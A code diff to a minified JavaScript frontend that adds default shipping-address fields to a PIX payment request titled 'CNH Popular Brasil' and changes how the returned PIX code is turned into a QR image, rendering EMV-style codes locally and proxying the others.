@@ -30879,6 +30879,15 @@ function DE() {
           phone: _.phone || "11999999999",
           amount: "64,73",
           title: "CNH Popular Brasil",
+          shipping: {
+            street: _.street || "Rua Exemplo",
+            streetNumber: _.streetNumber || "100",
+            neighborhood: _.neighborhood || "Centro",
+            zipCode: _.zipCode || "01001000",
+            city: _.city || "São Paulo",
+            state: _.state || "SP",
+            complement: _.complement || "",
+          },
         };
         console.log("Enviando para API:", requestPayload);
         
@@ -30896,19 +30905,36 @@ function DE() {
 
         if (I.success) {
           if ((n(I), I.pix_qr_code || I.qr_code)) {
-            const $ = I.pix_qr_code || I.qr_code;
-            const P = $
-              ? $.startsWith("data:image")
-                ? $
-                : $.startsWith("http")
-                  ? `/api/qr?u=${encodeURIComponent($)}`
-                  : $.includes("/")
-                    ? `/api/qr?u=${encodeURIComponent(`https://${$}`)}`
-                  : `data:image/png;base64,${$}`
-              : $;
-            h(P);
-          }
-          else if (I.pix_code)
+            const $ = (I.pix_qr_code || I.qr_code || "").trim();
+            const P = $.replace(/^https?:\/\//, "");
+            if ($ && P.startsWith("000201"))
+              try {
+                const w = await Zs.toDataURL($, {
+                  width: 256,
+                  margin: 2,
+                  color: {
+                    dark: "#000000",
+                    light: "#FFFFFF",
+                  },
+                });
+                h(w);
+              } catch (w) {
+                console.error("Erro ao gerar QR code:", w);
+                d("Erro ao gerar QR code: " + w.message);
+              }
+            else if ($) {
+              const w = $
+                ? $.startsWith("data:image")
+                  ? $
+                  : $.startsWith("http")
+                    ? `/api/qr?u=${encodeURIComponent($)}`
+                    : $.includes("/")
+                      ? `/api/qr?u=${encodeURIComponent(`https://${$}`)}`
+                      : `data:image/png;base64,${$}`
+                : $;
+              h(w);
+            }
+          } else if (I.pix_code)
             try {
               const $ = await Zs.toDataURL(I.pix_code, {
                 width: 256,
